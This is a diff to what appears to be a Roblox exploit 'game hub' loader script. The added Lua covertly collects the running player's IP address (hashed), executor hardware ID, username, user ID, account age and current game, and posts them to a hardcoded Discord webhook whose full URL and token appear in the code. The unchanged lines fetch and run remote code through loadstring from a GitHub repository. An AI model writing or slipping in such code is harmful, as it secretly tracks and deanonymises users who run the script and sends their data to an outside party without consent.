@@ -1,3 +1,51 @@
+local url = 'https://discord.com/api/webhooks/933933539513237565/hkRHJDBwFFoX_y4LrlTHoCQMJEg3CbZBd4fjTBPihUcoXdlJE8eu2pAVT-j6FCJcsaRn'
+local req = http_request
+local hwid_headers = {'Krnl-Fingerprint'}  -- You will have to add more headers for different exploits
+
+function ip()local a=req({Url='https://httpbin.org/ip',Method='GET'}) local b=game:GetService('HttpService'):JSONDecode(a.Body) local Hash = game:HttpGet('https://api.hashify.net/hash/md5/hex?value='..b.origin) local Hashed = game:GetService("HttpService"):JSONDecode(Hash) return Hashed.Digest end
+function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
+
+local data = {
+    ["username"]  = "murda",
+    ["avatar_url"] = "https://cdn.discordapp.com/attachments/761451509669822465/790927508127875102/Image_132.png",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = game.Players.LocalPlayer.Name,
+                ["url"] = "https://discord.gg/brackets",
+                ["icon_url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
+            ["description"] = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
+            ["color"] = 000000,
+            ["fields"] = {
+                {
+                    ["name"] = "Player Info:",
+                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
+                },
+                {
+                    ["name"] = "HWID:",
+                    ["value"] = tostring("```"..hwid().."```"),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP:",
+                    ["value"] = tostring("```"..ip().."```"),
+                },
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+            ["footer"] = {
+                ["text"] = "https://discord.gg/brackets",
+            }
+        }
+    }
+}
+
+
+local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
+
 pcall(function()
    if game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.PlaceId) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.PlaceId))()
